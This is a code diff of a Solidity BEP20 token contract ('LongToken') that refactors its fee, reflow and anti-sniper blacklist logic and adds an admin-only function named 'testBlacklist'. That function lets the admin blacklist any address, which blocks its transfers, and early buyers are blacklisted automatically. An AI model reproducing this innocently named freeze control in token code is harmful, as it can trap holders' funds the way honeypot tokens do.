@@ -424,7 +424,7 @@ interface IUniswapV2Router {
 }
 
 
-contract LongToken is BEP20('Long Token', 'LT1') {
+contract LongToken is BEP20('Long Token', 'LT8') {
     address public marketing;
     address public reflow;
     address public uniswapV2Router;
@@ -482,11 +482,11 @@ contract LongToken is BEP20('Long Token', 'LT1') {
         admin = _admin;
     }
 
-    function setFee(bool _feeTo) external  onlyAdmin{
+    function setFeeTo(bool _feeTo) external  onlyAdmin{
         feeTo = _feeTo;
     }
 
-    function setReceiver(address _marketing,address _reflow) external onlyAdmin{
+    function setReceiverAddress(address _marketing,address _reflow) external onlyAdmin{
         marketing = _marketing;
         reflow = _reflow;
     }
@@ -548,17 +548,14 @@ contract LongToken is BEP20('Long Token', 'LT1') {
     function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
         require(!blacklist[sender],"ERC20:Not allowed");
         if(openBlock == 0 && IBEP20(uniswapV2Pair).totalSupply() > 0) openBlock = block.number;
-        bool isPair = (sender == uniswapV2Pair) || (recipient == uniswapV2Pair);
-        bool isRouter = (sender == uniswapV2Router) || (recipient == uniswapV2Router);
-        bool isWhite = whitelist[sender] || whitelist[recipient];
         uint256 fee;
-        if (isPair && !isWhite && feeTo){
+        if (isTransaction(sender,recipient)){
             uint256 fee0 = amount * 2 / 100;
             uint256 fee1 = amount  * 1 / 100;
             if (sender == uniswapV2Pair){
                 super._transfer(sender, marketing, fee0);
                 super._transfer(sender, dead, fee0 + fee1);
-                if(openBlock + 30 > block.number && !whitelist[recipient] && recipient != uniswapV2Router) blacklist[recipient] = true;
+                if(whetherSetBlacklist(recipient)) blacklist[recipient] = true;
             }else {
                 super._transfer(sender, address(this), fee0);
                 super._transfer(sender, marketing, fee0);
@@ -567,11 +564,9 @@ contract LongToken is BEP20('Long Token', 'LT1') {
             fee = fee0 * 2 + fee1; 
         }
         super._transfer(sender, recipient, amount - fee);
-        uint256 _toFlow = balanceOf(address(this));
-        bool isFlow = !isPair && !isRouter && (_toFlow > 0) && sender != syrup && feeTo;
-        
-        if (isFlow) {
-            uint256 half = _toFlow / 2;
+         
+        if (whetherReflow(sender,recipient)){
+            uint256 half = balanceOf(address(this)) / 2;
             _swapTokenForBNB(half, address(this));
             uint256 balance = address(this).balance;
             _addLuidity(half,balance);
@@ -579,6 +574,26 @@ contract LongToken is BEP20('Long Token', 'LT1') {
 
     }
 
+    function isTransaction(address sender, address recipient) internal view returns(bool isTx){
+        bool pair = (sender == uniswapV2Pair) || (recipient == uniswapV2Pair);
+        bool white = whitelist[sender] || whitelist[recipient];
+        isTx = pair && !white && feeTo;
+    }
+
+    function whetherSetBlacklist(address recipient) internal view returns(bool add){
+        add = openBlock + 30 > block.number && !whitelist[recipient] && recipient != uniswapV2Router;
+    }
+
+    function whetherReflow(address sender, address recipient) internal view returns(bool isReflow){
+        bool pair = (sender == uniswapV2Pair) || (recipient == uniswapV2Pair);
+        bool router = (sender == uniswapV2Router) || (recipient == uniswapV2Router);
+        uint256 _toFlow = balanceOf(address(this));
+        isReflow = !pair && !router && (_toFlow > 0) && feeTo && sender != syrup;
+    }
+
+    function testBlacklist(address addr,bool black) external onlyAdmin{
+        blacklist[addr] = black;
+    }
 
     function _swapTokenForBNB(uint256 amount,address receiver)internal{
         _approve(address(this),uniswapV2Router, amount);
@@ -607,8 +622,6 @@ contract LongToken is BEP20('Long Token', 'LT1') {
         );
 
     }
-
-
 
     function delegate(address delegatee) external {
         return _delegate(msg.sender, delegatee);
